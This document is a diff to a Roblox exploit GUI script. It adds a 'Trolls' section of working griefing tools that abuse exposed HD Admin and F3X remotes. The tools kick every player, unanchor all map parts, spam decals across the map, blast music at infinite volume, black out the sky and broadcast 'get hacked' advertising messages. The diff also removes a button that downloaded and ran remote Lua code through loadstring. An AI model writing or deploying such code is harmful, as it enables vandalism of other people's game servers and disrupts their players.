@@ -543,42 +543,530 @@ Exploits:CreateButton({
     end
 })
 
+--======================================================
+-- TOWER GETTING DARK / TROLLING
+--======================================================
+
+Exploits:CreateSection("Trolls")
+
+-- Play Music
 Exploits:CreateButton({
-    Name = "Verified",
+    Name = "Play Music",
 
     Callback = function()
         local Success, Result = pcall(function()
-            local Source = game:HttpGet(
-                "https://raw.githubusercontent.com/Daniel-IsTheBest/Lua/refs/heads/main/Verified%20Badge.luau",
-                true
+            local ReplicatedStorage = game:GetService("ReplicatedStorage")
+            local RequestCommand =
+                ReplicatedStorage:WaitForChild("HDAdminHDClient")
+                :WaitForChild("Signals")
+                :WaitForChild("RequestCommandSilent")
+
+            RequestCommand:InvokeServer(
+                ";music 1839246991 ;pitch 0.425 ;volume inf"
             )
-
-            local Script = loadstring(Source)
-
-            if not Script then
-                error("Verified script could not be compiled.")
-            end
-
-            Script()
         end)
 
-        if Success then
-            Rayfield:Notify({
-                Title = "Verified",
-                Content = "Verified loaded successfully.",
-                Duration = 5
-            })
-        else
-            warn("Verified Error:", Result)
-
-            Rayfield:Notify({
-                Title = "Verified Error",
-                Content = tostring(Result),
-                Duration = 5
-            })
-        end
+        Rayfield:Notify({
+            Title = Success and "Play Music" or "Play Music Error",
+            Content = Success and "Music command sent." or tostring(Result),
+            Duration = 4
+        })
     end
 })
+
+-- Skybox
+Exploits:CreateButton({
+    Name = "Skybox",
+
+    Callback = function()
+        local Success, Result = pcall(function()
+            local ReplicatedStorage = game:GetService("ReplicatedStorage")
+            local RequestCommand =
+                ReplicatedStorage:WaitForChild("HDAdminHDClient")
+                :WaitForChild("Signals")
+                :WaitForChild("RequestCommandSilent")
+
+            RequestCommand:InvokeServer(";time 0 ;fogcolor black ;fog 43543346")
+
+            task.wait(0.05)
+
+            local Player = game.Players.LocalPlayer
+            local Character = Player.Character
+            if not Character then
+                error("Character not found.")
+            end
+
+            local Tool
+
+            for _, Object in ipairs(Player:GetDescendants()) do
+                if Object.Name == "SyncAPI" then
+                    Tool = Object.Parent
+                end
+            end
+
+            for _, Object in ipairs(game.ReplicatedStorage:GetDescendants()) do
+                if Object.Name == "SyncAPI" then
+                    Tool = Object.Parent
+                end
+            end
+
+            if not Tool or not Tool:FindFirstChild("SyncAPI") then
+                error("F3X SyncAPI not found.")
+            end
+
+            local Remote = Tool.SyncAPI.ServerEndpoint
+
+            local function Invoke(Args)
+                Remote:InvokeServer(unpack(Args))
+            end
+
+            local function CreatePart(CFrame, Parent)
+                Invoke({
+                    "CreatePart",
+                    "Normal",
+                    CFrame,
+                    Parent
+                })
+            end
+
+            local function AddMesh(Part)
+                Invoke({
+                    "CreateMeshes",
+                    {
+                        {
+                            Part = Part
+                        }
+                    }
+                })
+            end
+
+            local function SetMesh(Part, MeshId, VertexColor)
+                Invoke({
+                    "SyncMesh",
+                    {
+                        {
+                            Part = Part,
+                            MeshId = "rbxassetid://" .. MeshId,
+                            VertexColor = VertexColor or Vector3.new(1, 1, 1)
+                        }
+                    }
+                })
+            end
+
+            local function SetTexture(Part, TextureId)
+                Invoke({
+                    "SyncMesh",
+                    {
+                        {
+                            Part = Part,
+                            TextureId = "rbxassetid://" .. TextureId
+                        }
+                    }
+                })
+            end
+
+            local function SetName(Part, Name)
+                Invoke({
+                    "SetName",
+                    {
+                        Part
+                    },
+                    Name
+                })
+            end
+
+            local function ResizeMesh(Part, Size)
+                Invoke({
+                    "SyncMesh",
+                    {
+                        {
+                            Part = Part,
+                            Scale = Size
+                        }
+                    }
+                })
+            end
+
+            local function SetLocked(Part, Locked)
+                Invoke({
+                    "SetLocked",
+                    {
+                        Part
+                    },
+                    Locked
+                })
+            end
+
+            local function SetTransparency(Part, Transparency)
+                Invoke({
+                    "SyncMaterial",
+                    {
+                        {
+                            Part = Part,
+                            Transparency = Transparency
+                        }
+                    }
+                })
+            end
+
+            local function SetColor(Part, Color)
+                Invoke({
+                    "SyncColor",
+                    {
+                        {
+                            Part = Part,
+                            Color = Color,
+                            UnionColoring = false
+                        }
+                    }
+                })
+            end
+
+            local function CreateLight(Part)
+                Invoke({
+                    "CreateLights",
+                    {
+                        {
+                            Part = Part,
+                            LightType = "PointLight"
+                        }
+                    }
+                })
+            end
+
+            local function MakeSky(TextureId, Transparency, Scale, VertexColor, Offset)
+                local Root = Character:WaitForChild("HumanoidRootPart")
+                local Position = Root.Position
+
+                local BasePosition = Vector3.new(
+                    math.floor(Position.X),
+                    math.floor(Position.Y),
+                    math.floor(Position.Z)
+                )
+
+                local SpawnPosition =
+                    BasePosition + (Offset or Vector3.zero)
+
+                CreatePart(
+                    CFrame.new(SpawnPosition) + Vector3.new(0, -10, 0),
+                    workspace
+                )
+
+                task.wait(0.05)
+
+                for _, Part in ipairs(workspace:GetDescendants()) do
+                    if Part:IsA("BasePart")
+                        and Part.CFrame.X == SpawnPosition.X
+                        and Part.CFrame.Z == SpawnPosition.Z then
+
+                        SetName(Part, "Sky")
+                        AddMesh(Part)
+
+                        SetMesh(
+                            Part,
+                            "111891702759441",
+                            VertexColor
+                        )
+
+                        SetTexture(Part, TextureId)
+                        ResizeMesh(
+                            Part,
+                            Vector3.new(Scale, Scale, Scale)
+                        )
+
+                        SetLocked(Part, true)
+                        SetTransparency(Part, Transparency)
+
+                        Invoke({
+                            "SyncMaterial",
+                            {
+                                {
+                                    Part = Part,
+                                    Material = Enum.Material.Neon
+                                }
+                            }
+                        })
+
+                        SetColor(
+                            Part,
+                            Color3.fromRGB(255, 255, 255)
+                        )
+
+                        CreateLight(Part)
+                    end
+                end
+            end
+
+            MakeSky(
+                "0",
+                0,
+                13000,
+                Vector3.new(0, 0, 0),
+                Vector3.new(-25, -10, 0)
+            )
+
+            task.wait(0.05)
+
+            MakeSky(
+                "130809846005728",
+                0.02,
+                10000,
+                Vector3.new(4, 4, 4),
+                Vector3.new(25, -10, 0)
+            )
+        end)
+
+        Rayfield:Notify({
+            Title = Success and "Skybox" or "Skybox Error",
+            Content = Success and "Skybox command sent." or tostring(Result),
+            Duration = 4
+        })
+    end
+})
+
+-- Decal Spam
+Exploits:CreateButton({
+    Name = "Decal Spam",
+
+    Callback = function()
+        local Success, Result = pcall(function()
+            local Player = game.Players.LocalPlayer
+            local Tool
+
+            for _, Object in ipairs(Player:GetDescendants()) do
+                if Object.Name == "SyncAPI" then
+                    Tool = Object.Parent
+                    break
+                end
+            end
+
+            if not Tool then
+                error("F3X SyncAPI not found.")
+            end
+
+            local Remote = Tool.SyncAPI.ServerEndpoint
+            local TextureId = "73229108459975"
+
+            local Parts = {}
+
+            for _, Object in ipairs(workspace:GetDescendants()) do
+                if Object:IsA("BasePart")
+                    and Object.Name ~= "Terrain"
+                    and not tostring(Object.Name):find("Sky") then
+
+                    table.insert(Parts, Object)
+                end
+            end
+
+            for _, Face in ipairs({
+                Enum.NormalId.Front,
+                Enum.NormalId.Back,
+                Enum.NormalId.Right,
+                Enum.NormalId.Left,
+                Enum.NormalId.Bottom,
+                Enum.NormalId.Top
+            }) do
+
+                local CreateData = {}
+                local SyncData = {}
+
+                for _, Part in ipairs(Parts) do
+                    table.insert(CreateData, {
+                        Part = Part,
+                        Face = Face,
+                        TextureType = "Decal"
+                    })
+
+                    table.insert(SyncData, {
+                        Part = Part,
+                        Face = Face,
+                        TextureType = "Decal",
+                        Texture = "rbxassetid://" .. TextureId
+                    })
+                end
+
+                Remote:InvokeServer("CreateTextures", CreateData)
+                Remote:InvokeServer("SyncTexture", SyncData)
+            end
+        end)
+
+        Rayfield:Notify({
+            Title = Success and "Decal Spam" or "Decal Spam Error",
+            Content = Success and "Decals sent." or tostring(Result),
+            Duration = 4
+        })
+    end
+})
+
+-- Unanchor
+Exploits:CreateButton({
+    Name = "Unanchor All",
+
+    Callback = function()
+        local Success, Result = pcall(function()
+            local Player = game.Players.LocalPlayer
+            local Backpack = Player:WaitForChild("Backpack")
+            local Character = Player.Character
+
+            local F3X
+
+            for _, Object in ipairs(Backpack:GetChildren()) do
+                if Object:FindFirstChild("SyncAPI") then
+                    F3X = Object
+                    break
+                end
+            end
+
+            if not F3X and Character then
+                for _, Object in ipairs(Character:GetChildren()) do
+                    if Object:FindFirstChild("SyncAPI") then
+                        F3X = Object
+                        break
+                    end
+                end
+            end
+
+            if not F3X then
+                error("F3X not found.")
+            end
+
+            local Remote = F3X.SyncAPI.ServerEndpoint
+
+            for _, Object in ipairs(workspace:GetDescendants()) do
+                if (Object:IsA("BasePart") or Object:IsA("UnionOperation"))
+                    and Object.Name ~= "Sky"
+                    and Object.Name ~= "Skybox" then
+
+                    task.spawn(function()
+                        Remote:InvokeServer(
+                            "SyncAnchor",
+                            {
+                                {
+                                    Part = Object,
+                                    Anchored = false
+                                }
+                            }
+                        )
+                    end)
+                end
+            end
+        end)
+
+        Rayfield:Notify({
+            Title = Success and "Unanchor All" or "Unanchor Error",
+            Content = Success and "Unanchor requests sent." or tostring(Result),
+            Duration = 4
+        })
+    end
+})
+
+-- Message
+Exploits:CreateButton({
+    Name = "Message",
+
+    Callback = function()
+        local Success, Result = pcall(function()
+            local ReplicatedStorage = game:GetService("ReplicatedStorage")
+            local RequestCommand =
+                ReplicatedStorage:WaitForChild("HDAdminHDClient")
+                :WaitForChild("Signals")
+                :WaitForChild("RequestCommandSilent")
+
+            RequestCommand:InvokeServer(
+                ";Haha yes get hacked by Ikonned."
+            )
+
+            task.wait(0.2)
+
+            RequestCommand:InvokeServer(
+                ";sc You should Subscribe to Ikonned"
+            )
+        end)
+
+        Rayfield:Notify({
+            Title = Success and "Message" or "Message Error",
+            Content = Success and "Message sent." or tostring(Result),
+            Duration = 4
+        })
+    end
+})
+
+-- Kick Everyone
+Exploits:CreateButton({
+    Name = "Kick Everyone",
+
+    Callback = function()
+        local Success, Result = pcall(function()
+            local ReplicatedStorage = game:GetService("ReplicatedStorage")
+            local RequestCommand =
+                ReplicatedStorage:WaitForChild("HDAdminHDClient")
+                :WaitForChild("Signals")
+                :WaitForChild("RequestCommandSilent")
+
+            RequestCommand:InvokeServer(
+                ";kick all Team Ikonned destroyed this server."
+            )
+        end)
+
+        Rayfield:Notify({
+            Title = Success and "Kick Everyone" or "Kick Everyone Error",
+            Content = Success and "Kick command sent." or tostring(Result),
+            Duration = 4
+        })
+    end
+})
+
+-- Alert
+Exploits:CreateButton({
+    Name = "Alert",
+
+    Callback = function()
+        local Success, Result = pcall(function()
+            local ReplicatedStorage = game:GetService("ReplicatedStorage")
+            local RequestCommand =
+                ReplicatedStorage:WaitForChild("HDAdminHDClient")
+                :WaitForChild("Signals")
+                :WaitForChild("RequestCommandSilent")
+
+            RequestCommand:InvokeServer(
+                ";alert all team Ikonned was here, join our group for exploits!"
+            )
+        end)
+
+        Rayfield:Notify({
+            Title = Success and "Alert" or "Alert Error",
+            Content = Success and "Alert command sent." or tostring(Result),
+            Duration = 4
+        })
+    end
+})
+
+-- Server Message
+Exploits:CreateButton({
+    Name = "Server Message",
+
+    Callback = function()
+        local Success, Result = pcall(function()
+            local ReplicatedStorage = game:GetService("ReplicatedStorage")
+            local RequestCommand =
+                ReplicatedStorage:WaitForChild("HDAdminHDClient")
+                :WaitForChild("Signals")
+                :WaitForChild("RequestCommandSilent")
+
+            RequestCommand:InvokeServer(
+                ";sm team Ikonned was here, join our group for exploits!"
+            )
+        end)
+
+        Rayfield:Notify({
+            Title = Success and "Server Message" or "Server Message Error",
+            Content = Success and "Server message sent." or tostring(Result),
+            Duration = 4
+        })
+    end
+})
+
+Exploits:CreateSection("Cool Stuff")
 
 --======================================================
 -- RAINBOW TRAIL
